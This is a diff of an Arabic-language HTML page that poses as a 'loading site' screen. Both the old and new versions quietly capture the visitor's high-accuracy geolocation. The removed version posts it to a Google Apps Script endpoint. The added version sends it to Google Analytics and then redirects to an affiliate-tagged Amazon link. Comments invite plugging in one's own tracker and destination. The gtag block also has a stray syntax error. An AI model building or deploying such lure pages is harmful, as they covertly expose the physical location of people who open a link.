@@ -1,46 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 
 <head>
     <meta charset="UTF-8">
-    <title>موقعك</title>
+    <title>تحميل الموقع</title>
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-QJY5W3ZF4F'); // ← استبدله بكود التتبع الخاص بك
+        debug_mode: true  // ← هذا السطر مهم جدًا
+    </script>
+
+    <script>
+        function sendLocationAndRedirect() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+
+                        // إرسال الإحداثيات إلى Google Analytics
+                        gtag('event', 'user_location', {
+                            'event_category': 'Location',
+                            'event_label': 'User Entered Website',
+                            'latitude': lat,
+                            'longitude': lng
+                        });
+
+                        // الانتقال إلى صفحة أخرى
+                        setTimeout(() => {
+                            window.location.href = "https://www.amazon.eg/?&tag=txabkgodear-21&ref=pd_sl_46d0yk7yyd_e&adgrpid=154615811194&hvpone=&hvptwo=&hvadid=666769656869&hvpos=&hvnetw=g&hvrand=11662856211661327995&hvqmt=e&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=9112371&hvtargid=kwd-11440784425&hydadcr=4178_2170202&language=ar_AE"; // ← غيّرها للرابط اللي تحبه
+                        }, 1000); // ننتظر ثانية لضمان إرسال البيانات قبل الانتقال
+                    },
+                    function (error) {
+                        console.warn("فشل تحديد الموقع:", error.message);
+                        window.location.href = "home.html"; // حتى لو فشل، نحوله للصفحة
+                    },
+                    {
+                        enableHighAccuracy: true
+                    }
+                );
+            } else {
+                window.location.href = "home.html"; // لو المتصفح ما بيدعم
+            }
+        }
+
+        // ننفذ الكود تلقائيًا عند تحميل الصفحة
+        window.onload = sendLocationAndRedirect;
+    </script>
 </head>
 
 <body>
-    <h2>جارٍ تحديد موقعك...</h2>
-
-    <script>
-        const endpoint = "https://script.google.com/macros/s/AKfycbwzaDlrAgsm9bQJGOArr0b19c0qokadzhP46LEo0wPOP466Dy3cisHS12uZ_WLnRnio/exec"; // ← ضع رابط Web App الصحيح هنا
-
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(function (position) {
-                const data = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude
-                };
-
-                fetch(endpoint, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(data)
-                })
-                    .then(response => response.text())
-                    .then(text => {
-                        document.body.innerHTML += "<p>الرد من الخادم: " + text + "</p>";
-                    })
-                    .catch(error => {
-                        document.body.innerHTML += "<p>حدث خطأ أثناء الإرسال (fetch error)</p>";
-                        console.error(error);
-                    });
-            }, function (error) {
-                document.body.innerHTML += `<p>فشل في تحديد الموقع: ${error.message}</p>`;
-            });
-        } else {
-            document.body.innerHTML += "<p>المتصفح لا يدعم تحديد الموقع.</p>";
-        }
-    </script>
+    <h2>جارٍ تحميل الموقع...</h2>
 </body>
 
 </html>
